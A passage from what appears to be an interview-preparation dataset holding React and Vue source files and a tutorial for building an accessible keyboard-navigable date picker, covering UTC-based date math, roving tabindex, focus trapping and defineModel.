  th { font-size: 12px; color: #8b949e; font-weight: 500; padding: 4px 0; }
  td.day { text-align: center; padding: 8px 0; border-radius: 8px; cursor: pointer; font-size: 14px; }
  td.day:hover { background: #222834; }
  td.day:focus { outline: 2px solid #f9a825; outline-offset: -2px; }
  td.outside { color: #5d6573; }
  td.today { font-weight: 700; color: #f9a825; }
  td.selected { background: #f9a825; color: #1c140a; }
  td.disabled { color: #3d434d; cursor: not-allowed; text-decoration: line-through; }
  .out { margin-top: 16px; font-size: 14px; color: #9aa4b2; }
\`;

export default function App() {
  const [date, setDate] = useState("2024-02-10");
  return (
    <main className="page">
      <style>{css}</style>
      <DatePicker
        label="Check-in date"
        value={date}
        onChange={setDate}
        min="2024-02-05"
        max="2027-12-31"
      />
      <p className="out" data-testid="out">
        Selected: {date || "none"}
      </p>
    </main>
  );
}
`,
          "/src/DatePicker.js": `import { useEffect, useId, useRef, useState } from "react";
import {
  MONTHS,
  WEEKDAYS,
  addDays,
  addMonths,
  clamp,
  longLabel,
  monthGrid,
  parts,
  toISO,
  todayISO,
  weekday,
} from "./dates";

const WEEK_START = 0; // 0 = Sunday first, 1 = Monday first

export default function DatePicker({
  value,
  onChange,
  min,
  max,
  label = "Date",
}) {
  const [open, setOpen] = useState(false);
  const [focused, setFocused] = useState(value || todayISO());
  // move DOM focus into the grid after the next render?
  const wantFocus = useRef(false);
  const wrapRef = useRef(null);
  const gridRef = useRef(null);
  const triggerRef = useRef(null);
  const headingId = useId();
  const today = todayISO();

  // the visible month always follows the focused day
  const { y, m } = parts(focused);
  const cells = monthGrid(y, m, WEEK_START);
  const disabled = (iso) => (min && iso < min) || (max && iso > max);

  function openPicker() {
    setFocused(clamp(value || today, min, max));
    wantFocus.current = true;
    setOpen(true);
  }
  function close(returnFocus) {
    setOpen(false);
    if (returnFocus) triggerRef.current?.focus();
  }
  function moveTo(iso, takeFocus) {
    setFocused(clamp(iso, min, max));
    wantFocus.current = takeFocus;
  }
  function select(iso) {
    if (disabled(iso)) return;
    onChange(iso);
    close(true);
  }

  // After a keyboard move, put DOM focus on the
  // cell with tabIndex 0 (roving tabindex).
  useEffect(() => {
    if (open && wantFocus.current) {
      wantFocus.current = false;
      gridRef.current?.querySelector('[tabindex="0"]')?.focus();
    }
  });

  // Click outside closes without stealing focus.
  // Cleanup removes the listener (StrictMode-safe).
  useEffect(() => {
    if (!open) return;
    const onDown = (e) => {
      if (!wrapRef.current?.contains(e.target)) setOpen(false);
    };
    document.addEventListener("mousedown", onDown);
    return () => document.removeEventListener("mousedown", onDown);
  }, [open]);

  function onGridKey(e) {
    const dow = (weekday(focused) - WEEK_START + 7) % 7;
    const moves = {
      ArrowLeft: () => addDays(focused, -1),
      ArrowRight: () => addDays(focused, 1),
      ArrowUp: () => addDays(focused, -7),
      ArrowDown: () => addDays(focused, 7),
      Home: () => addDays(focused, -dow),
      End: () => addDays(focused, 6 - dow),
      PageUp: () => addMonths(focused, e.shiftKey ? -12 : -1),
      PageDown: () => addMonths(focused, e.shiftKey ? 12 : 1),
    };
    if (moves[e.key]) {
      e.preventDefault();
      moveTo(moves[e.key](), true);
    } else if (e.key === "Enter" || e.key === " ") {
      e.preventDefault();
      select(focused);
    }
  }

  function onDialogKey(e) {
    if (e.key === "Escape") {
      e.preventDefault();
      close(true);
      return;
    }
    // focus trap: wrap Tab / Shift+Tab inside the dialog
    if (e.key !== "Tab") return;
    const items = [
      ...e.currentTarget.querySelectorAll(
        'button:not([disabled]), [tabindex="0"]',
      ),
    ];
    const i = items.indexOf(document.activeElement);
    const next = e.shiftKey
      ? i <= 0
        ? items.length - 1
        : i - 1
      : i === items.length - 1
        ? 0
        : i + 1;
    e.preventDefault();
    items[next].focus();
  }

  // A nav button is disabled when every day
  // of the target month is out of range.
  const nav = (n, text, name) => {
    const blocked =
      n < 0
        ? min && toISO(y, m + n + 1, 0) < min
        : max && toISO(y, m + n, 1) > max;
    return (
      <button
        type="button"
        aria-label={name}
        disabled={!!blocked}
        onClick={() => moveTo(addMonths(focused, n), false)}
      >
        {text}
      </button>
    );
  };

  return (
    <div className="dp" ref={wrapRef}>
      <span className="dp-label">{label}</span>
      <button
        ref={triggerRef}
        type="button"
        className="dp-trigger"
        data-testid="trigger"
        aria-haspopup="dialog"
        aria-expanded={open}
        onClick={() => (open ? close(false) : openPicker())}
      >
        {value ? longLabel(value) : "Pick a date"}
      </button>
      {open && (
        <div
          role="dialog"
          aria-modal="true"
          aria-labelledby={headingId}
          className="dp-pop"
          onKeyDown={onDialogKey}
        >
          <div className="dp-head">
            {nav(-12, "«", "Previous year")}
            {nav(-1, "‹", "Previous month")}
            <h2 id={headingId} aria-live="polite" data-testid="heading">
              {MONTHS[m]} {y}
            </h2>
            {nav(1, "›", "Next month")}
            {nav(12, "»", "Next year")}
          </div>
          <table
            role="grid"
            aria-labelledby={headingId}
            ref={gridRef}
            onKeyDown={onGridKey}
          >
            <thead>
              <tr>
                {WEEKDAYS.map((_, i) => WEEKDAYS[(i + WEEK_START) % 7]).map(
                  (d) => (
                    <th key={d} scope="col" abbr={d}>
                      {d.slice(0, 2)}
                    </th>
                  ),
                )}
              </tr>
            </thead>
            <tbody>
              {[0, 1, 2, 3, 4, 5].map((row) => (
                <tr key={row}>
                  {cells.slice(row * 7, row * 7 + 7).map((iso) => {
                    const off = disabled(iso);
                    const cls = [
                      "day",
                      iso.slice(0, 7) !== focused.slice(0, 7) && "outside",
                      iso === today && "today",
                      iso === value && "selected",
                      off && "disabled",
                    ]
                      .filter(Boolean)
                      .join(" ");
                    return (
                      <td
                        key={iso}
                        className={cls}
                        data-date={iso}
                        tabIndex={iso === focused ? 0 : -1}
                        aria-label={longLabel(iso)}
                        aria-selected={iso === value}
                        aria-disabled={off || undefined}
                        aria-current={iso === today ? "date" : undefined}
                        onClick={() => select(iso)}
                      >
                        {parts(iso).d}
                      </td>
                    );
                  })}
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      )}
    </div>
  );
}
`,
          "/src/dates.js": `// Calendar-date helpers. A date is an ISO
// string "YYYY-MM-DD" (no time, no zone).
// All arithmetic goes through Date.UTC, which has no daylight-saving jumps,
// so the grid is the same in every time zone.
export const MONTHS = [
  "January",
  "February",
  "March",
  "April",
  "May",
  "June",
  "July",
  "August",
  "September",
  "October",
  "November",
  "December",
];
export const WEEKDAYS = [
  "Sunday",
  "Monday",
  "Tuesday",
  "Wednesday",
  "Thursday",
  "Friday",
  "Saturday",
];

const pad = (n) => String(n).padStart(2, "0");

// Normalises overflow: toISO(2024, 1, 30) is "2024-03-01".
export function toISO(y, m, d) {
  const t = new Date(Date.UTC(y, m, d));
  return (
    t.getUTCFullYear() +
    "-" +
    pad(t.getUTCMonth() + 1) +
    "-" +
    pad(t.getUTCDate())
  );
}
export function parts(iso) {
  const [y, m, d] = iso.split("-").map(Number);
  return { y, m: m - 1, d };
}
export const daysInMonth = (y, m) =>
  new Date(Date.UTC(y, m + 1, 0)).getUTCDate();
export const weekday = (iso) => {
  const { y, m, d } = parts(iso);
  return new Date(Date.UTC(y, m, d)).getUTCDay();
};
export const addDays = (iso, n) => {
  const { y, m, d } = parts(iso);
  return toISO(y, m, d + n);
};
// Jan 31 + 1 month is Feb 29 (2024), not Mar 2: clamp to the target month.
export const addMonths = (iso, n) => {
  const { y, m, d } = parts(iso);
  return toISO(y, m + n, Math.min(d, daysInMonth(y, m + n)));
};
// "Today" is the user's LOCAL calendar date, read once from the clock.
export const todayISO = () => {
  const now = new Date();
  return toISO(now.getFullYear(), now.getMonth(), now.getDate());
};
// 6 weeks x 7 days = 42 cells, starting on the weekStart before the 1st.
export function monthGrid(y, m, weekStart = 0) {
  const first = toISO(y, m, 1);
  const lead = (weekday(first) - weekStart + 7) % 7;
  const start = addDays(first, -lead);
  return Array.from({ length: 42 }, (_, i) => addDays(start, i));
}
export const longLabel = (iso) => {
  const { y, m, d } = parts(iso);
  return WEEKDAYS[weekday(iso)] + ", " + MONTHS[m] + " " + d + ", " + y;
};
export const clamp = (iso, min, max) =>
  min && iso < min ? min : max && iso > max ? max : iso;
`,
        },
      },
      vue: {
        answer: `**Target Audience:** Vue developers preparing for a machine coding round. Assumes \`<script setup>\`, \`ref\` and \`computed\`; no calendar or ARIA background needed.
**Difficulty:** Hard

> **How to read this doc:** Plain explanation first, then a <code>📌 Interview term:</code> callout with the exact vocabulary. The "Verified" output was printed by this Vue 3.5.44 solution, compiled with \`@vue/compiler-sfc\`, mounted with \`createApp(App).mount("#app")\` in jsdom and driven by a script.

## 1. Why This Even Matters — A Story First

A wall calendar answers two questions instantly: "which weekday is the 1st?" and "what is the same day next month?". A date picker has to answer them in code, for every month, in every time zone, for a user who may only have a keyboard. Interviewers pick it because it tests date math, reactivity and accessibility in one small widget.

The range-selection sibling, [Build a Date Picker Calendar with Range Selection](/interview-question/build-a-date-picker-calendar-with-range-selection), builds on this one.

## 2. Requirements and the Vue State Model

A trigger button opens a popup month grid (6 × 7 days). Prev / next month and year buttons, today highlighted, days before \`min\` disabled, full keyboard support, Escape to close, focus back on the trigger.

| Piece | Vue tool | Why |
| :--- | :--- | :--- |
| Selected date | \`defineModel()\` | The parent writes \`v-model="date"\`; the picker reads and writes \`value.value\`. |
| \`open\`, \`focused\` | \`ref\` | The popup flag and the day holding the focus ring. |
| Visible month | \`computed(() => parts(focused.value))\` | Derived, never stored, so the grid always shows the focused day's month. |
| 42 cells, 6 rows | \`computed\` | Re-run only when \`focused\` changes month or day. |
| Heading id | \`useId()\` | Stable, unique id for \`aria-labelledby\`. |
| DOM handles | template refs | Focusing a cell, returning focus, outside-click checks. |

📌 **Interview term: defineModel** — a \`<script setup>\` macro (Vue 3.4+) that declares a \`modelValue\` prop plus an \`update:modelValue\` event and hands you one ref. Writing to it emits the event. It replaces the hand-written prop + emit pair described in [defineModel](/interview-question/what-is-definemodel-in-vue-3-4-and-how-does-it-replace-manual-prop-emit).

<svg class="iq-diagram" width="100%" viewBox="0 0 640 150" role="img" aria-label="v-model flow: App date ref goes down as modelValue, DatePicker writes value, which emits update modelValue back to App">
  <defs>
    <marker id="dp1v-arrow" markerWidth="8" markerHeight="8" refX="5" refY="3" orient="auto">
      <path class="d-arrow" d="M0,0 L7,3 L0,6 Z"/>
    </marker>
  </defs>
  <rect class="d-box-muted" x="20" y="45" width="180" height="60" rx="10"/>
  <text class="d-text" x="110" y="70" text-anchor="middle">App</text>
  <text class="d-sub" x="110" y="90" text-anchor="middle">date = ref</text>
  <rect class="d-box-accent" x="440" y="45" width="180" height="60" rx="10"/>
  <text class="d-text d-accent" x="530" y="70" text-anchor="middle">DatePicker</text>
  <text class="d-sub" x="530" y="90" text-anchor="middle">value = defineModel</text>
  <path class="d-edge-accent" d="M 200 60 L 436 60" marker-end="url(#dp1v-arrow)"/>
  <text class="d-sub" x="318" y="48" text-anchor="middle">modelValue prop</text>
  <path class="d-edge-dashed" d="M 440 92 L 204 92" marker-end="url(#dp1v-arrow)"/>
  <text class="d-sub" x="318" y="124" text-anchor="middle">update:modelValue event</text>
</svg>

The picker never owns the chosen date; it only proposes changes. That keeps the form state in one place.

## 3. Build It Step by Step

### 3.1 Dates without time zones

Dates are ISO strings (\`"2024-02-10"\`) and every calculation goes through \`Date.UTC\`, which has no daylight saving. The helpers live in a plain \`dates.js\` shared with the template:

\`\`\`js
export const daysInMonth = (y, m) =>
  new Date(Date.UTC(y, m + 1, 0)).getUTCDate(); // day 0 trick
export const addMonths = (iso, n) => {
  const { y, m, d } = parts(iso);
  // Jan 31 -> Feb 29
  return toISO(y, m + n, Math.min(d, daysInMonth(y, m + n)));
};
export function monthGrid(y, m, weekStart = 0) {
  const first = toISO(y, m, 1);
  const lead = (weekday(first) - weekStart + 7) % 7;
  return Array.from({ length: 42 }, (_, i) => addDays(first, i - lead));
}
\`\`\`

(The shipped \`monthGrid\` computes the start day first; same result.) Adding \`86400000\` ms to a local midnight instead is the classic bug: run with \`TZ=America/New_York\`, a naive loop printed November 2026 as \`1,1,2,3,...\` because 1 November has 25 hours there.

📌 **Interview term: Calendar date** — a day with no time or zone attached. Booking, birthdays and holidays are calendar dates; storing them as \`Date\` instants invites off-by-one-day bugs. The Temporal API models this directly as \`PlainDate\` ([Temporal and time zones](/interview-question/temporal-in-practice-how-do-you-correctly-handle-time-zones-dst-and-calendar-ari)).

### 3.2 State that derives the grid

\`\`\`js
const value = defineModel({ type: String, default: null });
const open = ref(false);
const focused = ref(value.value || todayISO());
const view = computed(() => parts(focused.value));
const cells = computed(() =>
  monthGrid(view.value.y, view.value.m, WEEK_START),
);
const rows = computed(() =>
  [0, 1, 2, 3, 4, 5].map((r) => cells.value.slice(r * 7, r * 7 + 7)),
);
\`\`\`

📌 **Interview term: computed** — a cached derived value that re-runs only when the refs it read change ([computed vs watch](/interview-question/what-is-the-difference-between-computed-and-watch)). Because \`view\` is computed from \`focused\`, ArrowDown from 28 February simply sets \`focused\` to 6 March and March appears.

### 3.3 Roving tabindex and focus after the patch

Only the focused cell has \`tabindex="0"\`; arrows move it. Setting \`focused\` does not move browser focus, and the new cell is not in the DOM yet, so the component waits for Vue's next DOM patch:

\`\`\`js
async function focusCell() {
  await nextTick(); // the DOM now shows the new month
  grid.value?.querySelector('[tabindex="0"]')?.focus();
}
function moveTo(iso, takeFocus) {
  focused.value = clamp(iso, props.min, props.max);
  if (takeFocus) focusCell();
}
\`\`\`

📌 **Interview term: nextTick** — a promise that resolves after Vue has flushed pending DOM updates ([nextTick](/interview-question/what-is-nexttick-in-vue)). It is the Vue answer to "the element I want to focus does not exist yet".

📌 **Interview term: Roving tabindex** — one \`tabindex="0"\` inside a composite widget, everything else \`-1\`, arrow keys move the zero. Tab enters the grid once instead of 42 times.

### 3.4 The template

\`\`\`vue
<td
  v-for="iso in row"
  :key="iso"
  :class="cellClass(iso)"
  :data-date="iso"
  :tabindex="iso === focused ? 0 : -1"
  :aria-label="longLabel(iso)"
  :aria-selected="iso === value"
  :aria-disabled="disabled(iso) || undefined"
  :aria-current="iso === today ? 'date' : undefined"
  @click="select(iso)"
>
  {{ parts(iso).d }}
</td>
\`\`\`

Binding \`undefined\` removes an attribute, so only disabled cells carry \`aria-disabled\` and only today carries \`aria-current="date"\`. The header uses \`<template v-for>\` over the four nav buttons and drops the \`h2\` in after the second one, so the buttons stay data-driven.

### 3.5 Keyboard, dialog and outside click

The grid \`@keydown\` maps keys to targets (\`ArrowUp\` is minus 7 days, \`PageDown\` is \`addMonths(f, 1)\`, Shift adds 12 months), calls \`preventDefault()\` and \`moveTo\`. The dialog \`@keydown\` handles Escape (close, focus the trigger) and a Tab trap over enabled buttons plus the one \`tabindex="0"\` cell, the same recipe as an [accessible modal](/interview-question/build-an-accessible-modal-with-focus-trap-scroll-lock).

The outside-click listener exists only while the popup is open:

\`\`\`js
watch(open, (isOpen) => {
  if (isOpen) document.addEventListener("mousedown", onDown);
  else document.removeEventListener("mousedown", onDown);
});
onBeforeUnmount(() =>
  document.removeEventListener("mousedown", onDown),
);
\`\`\`

\`onBeforeUnmount\` covers the case where the parent removes the picker while it is open.

## 4. Verified

Mounted with Vue 3.5.44 in jsdom, \`TZ=America/New_York\`, initial value 10 February 2024 and \`min="2024-02-05"\`, driven by the same script as the React and Angular versions:

\`\`\`text
TZ=America/New_York trigger: "Saturday, February 10, 2024"
open: dialog | expanded: true | focus: 2024-02-10
February 2024: 2024-01-28 .. 2024-03-09 (42 cells, strictly increasing: true)
Feb 1 disabled (min 2024-02-05): true | Prev month disabled: true
click Feb 1 (disabled) -> still open | Selected: 2024-02-10
after Right, Down, End, Home, Up, Up -> focus: 2024-02-05 (clamped at min)
PageDown -> 2024-03-05 | March 2024
Left, PageUp -> 2024-02-05
Shift+PageDown -> 2025-02-05 | tabindex=0 cells: 1
March 2026: 2026-03-01 .. 2026-04-11 (42 cells, strictly increasing: true)
November 2026: 2026-11-01 .. 2026-12-12 (42 cells, strictly increasing: true)
Previous year button -> November 2025 | focus stays on: Previous year
Tab x5: Previous month > Next month > Next year > 2025-11-05 > Previous year | Shift+Tab: 2025-11-05
Enter -> dialog: closed | focus: trigger | Selected: 2025-11-05
reopen focus: 2025-11-05 | selected cell aria-selected: 2025-11-05
Escape -> dialog: closed | focus: trigger | Selected: 2025-11-05
reopened: open
mousedown outside -> closed
\`\`\`

The \`Selected:\` line is the parent's paragraph, so it proves \`v-model\` round-tripped through \`defineModel\`. The run with \`TZ=Pacific/Auckland\` printed the same lines. jsdom does not focus buttons on click, so the driver focused "Previous year" before clicking it; layout and the focus ring were not checked visually.

## 5. Edge Cases and Accessibility

| Concern | Handling |
| :--- | :--- |
| Leap years, month lengths | Day-zero trick in UTC |
| DST | No millisecond day loops |
| Out-of-range focus | \`clamp\` in \`moveTo\`; nav buttons disabled for fully blocked months |
| Screen reader | \`role="dialog"\`, \`aria-modal\`, \`role="grid"\`, full date in \`aria-label\`, live \`h2\` |
| Escape and focus return | Escape closes and focuses the trigger |

## 6. Common Pitfalls

- **Focusing in the handler instead of after \`nextTick\`.** The new month's cell does not exist yet, so focus silently stays on a removed node.
- **A separate \`viewMonth\` ref.** It drifts from \`focused\`. Make it \`computed\`.
- **Leaving the document listener attached.** Remove it when the popup closes and in \`onBeforeUnmount\`.
- **\`:aria-selected="selected"\` with \`selected\` undefined.** Bind a real boolean; \`undefined\` drops the attribute.
- **Parsing \`"2024-02-10"\` with \`new Date()\`.** It is UTC midnight, the 9th in the Americas. Split the string.
- **Mutating the prop.** Write through the \`defineModel\` ref, never to \`props.modelValue\`.

## 7. How to Answer in an Interview

<div style="background:#1c140a;border:2px solid #f9a825;border-radius:10px;padding:20px 24px;margin:20px 0;">

<div style="color:#ffca28;font-size:1.15em;font-weight:bold;margin-bottom:16px;">🎤 How to Answer in an Interview</div>

<div style="color:#e0a83e;font-size:0.8em;font-weight:bold;text-transform:uppercase;letter-spacing:0.6px;margin:0 0 10px 0;">The 60-Second Answer</div>

<blockquote style="border-left:3px solid #f9a825;margin:10px 0;padding:2px 0 2px 14px;color:#f0e2c8;">
<strong style="color:#ffca28;">1. State:</strong> <span style="color:#f0e2c8;">"One <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">defineModel</code> for the value, <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">open</code> and <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">focused</code> refs, and the visible month as a <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">computed</code> of <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">focused</code>."</span>
</blockquote>

<blockquote style="border-left:3px solid #f9a825;margin:10px 0;padding:2px 0 2px 14px;color:#f0e2c8;">
<strong style="color:#ffca28;">2. Dates:</strong> <span style="color:#f0e2c8;">"ISO strings and <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">Date.UTC</code> math, so a 25-hour day can never duplicate a cell; month length from day zero of the next month."</span>
</blockquote>

<blockquote style="border-left:3px solid #f9a825;margin:10px 0;padding:2px 0 2px 14px;color:#f0e2c8;">
<strong style="color:#ffca28;">3. Grid:</strong> <span style="color:#f0e2c8;">"A computed 42-cell grid, chunked into 6 rows, rendered with <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">v-for</code> keyed by the ISO date."</span>
</blockquote>

<blockquote style="border-left:3px solid #f9a825;margin:10px 0;padding:2px 0 2px 14px;color:#f0e2c8;">
<strong style="color:#ffca28;">4. Keyboard:</strong> <span style="color:#f0e2c8;">"A key map moves <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">focused</code>, clamped to min and max, then <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">nextTick</code> focuses the one cell with <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">tabindex</code> 0."</span>
</blockquote>

<blockquote style="border-left:3px solid #f9a825;margin:10px 0;padding:2px 0 2px 14px;color:#f0e2c8;">
<strong style="color:#ffca28;">5. Dialog:</strong> <span style="color:#f0e2c8;">"Escape and a Tab trap on the dialog, focus back to the trigger, and a document listener added by a <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">watch</code> on <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">open</code>."</span>
</blockquote>

<div style="color:#e0a83e;font-size:0.8em;font-weight:bold;text-transform:uppercase;letter-spacing:0.6px;margin:22px 0 10px 0;border-top:1px solid #4a3a1a;padding-top:16px;">Follow-Up Questions to Expect</div>

<div style="background:#3d2810;border-radius:8px 8px 0 0;padding:10px 16px;margin:12px 0 0 0;">
<span style="color:#ff8a65;font-weight:bold;">❓ Q:</span> <span style="color:#ffe0b2;">Why <code style="background:#4a3418;color:#ffe0b2;padding:1px 5px;border-radius:3px;">defineModel</code> and not a prop plus emit?</span>
</div>
<div style="background:#151a15;border:1px solid #f9a825;border-top:none;border-radius:0 0 8px 8px;padding:10px 16px;margin:0 0 14px 0;">
<span style="color:#66bb6a;font-weight:bold;">💡 A:</span> <span style="color:#d8d8d8;">It is the same contract, <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">modelValue</code> plus <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">update:modelValue</code>, with less code and no chance of mutating the prop. Old parents using <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">:modelValue</code> and <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">@update:modelValue</code> still work.</span>
</div>

<div style="background:#3d2810;border-radius:8px 8px 0 0;padding:10px 16px;margin:0;">
<span style="color:#ff8a65;font-weight:bold;">❓ Q:</span> <span style="color:#ffe0b2;">Could you use <code style="background:#4a3418;color:#ffe0b2;padding:1px 5px;border-radius:3px;">watchEffect</code> to focus the cell?</span>
</div>
<div style="background:#151a15;border:1px solid #f9a825;border-top:none;border-radius:0 0 8px 8px;padding:10px 16px;margin:0 0 14px 0;">
<span style="color:#66bb6a;font-weight:bold;">💡 A:</span> <span style="color:#d8d8d8;">You could watch <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">focused</code> with <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">flush: 'post'</code>, which runs after the DOM update. Calling <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">nextTick</code> inside <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">moveTo</code> is more explicit and only focuses when the keyboard moved, not when a nav button was clicked.</span>
</div>

<div style="background:#3d2810;border-radius:8px 8px 0 0;padding:10px 16px;margin:0;">
<span style="color:#ff8a65;font-weight:bold;">❓ Q:</span> <span style="color:#ffe0b2;">How would you add a typed input?</span>
</div>
<div style="background:#151a15;border:1px solid #f9a825;border-top:none;border-radius:0 0 8px 8px;padding:10px 16px;margin:0 0 14px 0;">
<span style="color:#66bb6a;font-weight:bold;">💡 A:</span> <span style="color:#d8d8d8;">Add a text input bound to a local draft, parse on blur or Enter with a strict format, and only write the model when it is a valid date in range; the calendar becomes a secondary picker for it.</span>
</div>

<div style="background:#3d2810;border-radius:8px 8px 0 0;padding:10px 16px;margin:0;">
<span style="color:#ff8a65;font-weight:bold;">❓ Q:</span> <span style="color:#ffe0b2;">How do you test it?</span>
</div>
<div style="background:#151a15;border:1px solid #f9a825;border-top:none;border-radius:0 0 8px 8px;padding:10px 16px;margin:0;">
<span style="color:#66bb6a;font-weight:bold;">💡 A:</span> <span style="color:#d8d8d8;">Vue Test Utils with <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">attachTo: document.body</code> so focus works, trigger keydowns, await <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">nextTick</code>, assert <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">document.activeElement</code>; run the date helpers under several <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">TZ</code> values in CI.</span>
</div>

</div>

## 8. Quick Glossary

| Term | Plain meaning |
| :--- | :--- |
| **defineModel** | Macro that turns \`v-model\` into one writable ref |
| **computed** | Cached derived value that re-runs when its inputs change |
| **nextTick** | Waits for Vue to patch the DOM |
| **Roving tabindex** | One tabbable child, arrows move it |
| **Calendar date** | A day without a time or zone |

---
**Conclusion:** In Vue the picker is mostly declarative: \`defineModel\` owns the value, \`computed\` derives the month and the 42 cells from the focused day, and the only imperative parts are a \`nextTick\` focus call and a document listener managed by \`watch\`. Keep dates as UTC-based ISO strings and the same grid comes out in every time zone, as the verified run shows.`,
        files: {
          "/src/App.vue": `<script setup>
import { ref } from "vue";
import DatePicker from "./components/DatePicker.vue";

const date = ref("2024-02-10");
</script>

<template>
  <main class="page">
    <DatePicker
      v-model="date"
      label="Check-in date"
      min="2024-02-05"
      max="2027-12-31"
    />
    <p class="out" data-testid="out">Selected: {{ date || "none" }}</p>
  </main>
</template>

<style>
body {
  margin: 0;
  background: #0f1115;
  color: #e6e6e6;
  font-family: system-ui, sans-serif;
}
.page {
  max-width: 420px;
  margin: 0 auto;
  padding: 24px 16px;
}
.dp {
  position: relative;
  display: flex;
  flex-direction: column;
  gap: 6px;
}
.dp-label {
  font-size: 13px;
  color: #9aa4b2;
}
.dp-trigger {
  text-align: left;
  padding: 10px 12px;
  border-radius: 8px;
  border: 1px solid #2c3340;
  background: #171a21;
  color: inherit;
  font: inherit;
  cursor: pointer;
}
.dp-pop {
  position: absolute;
  top: 100%;
  left: 0;
  margin-top: 6px;
  z-index: 10;
  width: min(320px, 100%);
  background: #171a21;
  border: 1px solid #2c3340;
  border-radius: 12px;
  padding: 12px;
  box-shadow: 0 10px 30px #0008;
}
.dp-head {
  display: flex;
  align-items: center;
  gap: 4px;
  margin-bottom: 8px;
}
.dp-head h2 {
  flex: 1;
  text-align: center;
  font-size: 15px;
  margin: 0;
}
.dp-head button {
  background: none;
  border: 0;
  color: #c9d1d9;
  font-size: 18px;
  width: 32px;
  height: 32px;
  border-radius: 6px;
  cursor: pointer;
}
.dp-head button:disabled {
  opacity: 0.3;
  cursor: default;
}
table {
  width: 100%;
  border-collapse: collapse;
}
th {
  font-size: 12px;
  color: #8b949e;
  font-weight: 500;
  padding: 4px 0;
}
td.day {
  text-align: center;
  padding: 8px 0;
  border-radius: 8px;
  cursor: pointer;
  font-size: 14px;
}
td.day:hover {
  background: #222834;
}
td.day:focus {
  outline: 2px solid #f9a825;
  outline-offset: -2px;
}
td.outside {
  color: #5d6573;
}
td.today {
  font-weight: 700;
  color: #f9a825;
}
td.selected {
  background: #f9a825;
  color: #1c140a;
}
td.disabled {
  color: #3d434d;
  cursor: not-allowed;
  text-decoration: line-through;
}
.out {
  margin-top: 16px;
  font-size: 14px;
  color: #9aa4b2;
}
</style>
`,
          "/src/components/DatePicker.vue": `<script setup>
import { computed, nextTick, onBeforeUnmount, ref, useId, watch } from "vue";
import {
  MONTHS,
  WEEKDAYS,
  addDays,
  addMonths,
  clamp,
  longLabel,
  monthGrid,
  parts,
  toISO,
  todayISO,
  weekday,
} from "../dates.js";

const WEEK_START = 0; // 0 = Sunday first, 1 = Monday first
const props = defineProps({
  min: String,
  max: String,
  label: { type: String, default: "Date" },
});
// v-model on the parent
const value = defineModel({ type: String, default: null });

const open = ref(false);
const focused = ref(value.value || todayISO());
const wrap = ref(null);
const grid = ref(null);
const trigger = ref(null);
const headingId = useId();
const today = todayISO();

// The visible month always follows the focused day.
const view = computed(() => parts(focused.value));
const cells = computed(() => monthGrid(view.value.y, view.value.m, WEEK_START));
const heads = WEEKDAYS.map((_, i) => WEEKDAYS[(i + WEEK_START) % 7]);
const rows = computed(() =>
  [0, 1, 2, 3, 4, 5].map((r) => cells.value.slice(r * 7, r * 7 + 7)),
);
const disabled = (iso) =>
  !!((props.min && iso < props.min) || (props.max && iso > props.max));

async function focusCell() {
  await nextTick(); // wait for the DOM patch, then move focus (roving tabindex)
  grid.value?.querySelector('[tabindex="0"]')?.focus();
}
function openPicker() {
  focused.value = clamp(value.value || today, props.min, props.max);
  open.value = true;
  focusCell();
}
function close(returnFocus) {
  open.value = false;
  if (returnFocus) trigger.value?.focus();
}
function moveTo(iso, takeFocus) {
  focused.value = clamp(iso, props.min, props.max);
  if (takeFocus) focusCell();
}
function select(iso) {
  if (disabled(iso)) return;
  value.value = iso;
  close(true);
}

function onGridKey(e) {
  const f = focused.value;
  const dow = (weekday(f) - WEEK_START + 7) % 7;
  const moves = {
    ArrowLeft: () => addDays(f, -1),
    ArrowRight: () => addDays(f, 1),
    ArrowUp: () => addDays(f, -7),
    ArrowDown: () => addDays(f, 7),
    Home: () => addDays(f, -dow),
    End: () => addDays(f, 6 - dow),
    PageUp: () => addMonths(f, e.shiftKey ? -12 : -1),
    PageDown: () => addMonths(f, e.shiftKey ? 12 : 1),
  };
  if (moves[e.key]) {
    e.preventDefault();
    moveTo(moves[e.key](), true);
  } else if (e.key === "Enter" || e.key === " ") {
    e.preventDefault();
    select(f);
  }
}

function onDialogKey(e) {
  if (e.key === "Escape") {
    e.preventDefault();
    close(true);
    return;
  }
  if (e.key !== "Tab") return; // focus trap
  const items = [
    ...e.currentTarget.querySelectorAll(
      'button:not([disabled]), [tabindex="0"]',
    ),
  ];
  const i = items.indexOf(document.activeElement);
  const next = e.shiftKey
    ? i <= 0
      ? items.length - 1
      : i - 1
    : i === items.length - 1
      ? 0
      : i + 1;
  e.preventDefault();
  items[next].focus();
}

// A nav button is disabled when every day of the target month is out of range.
const blocked = (n) => {
  const { y, m } = view.value;
  return !!(n < 0
    ? props.min && toISO(y, m + n + 1, 0) < props.min
    : props.max && toISO(y, m + n, 1) > props.max);
};
const navs = [
  { n: -12, text: "«", name: "Previous year" },
  { n: -1, text: "‹", name: "Previous month" },
  { n: 1, text: "›", name: "Next month" },
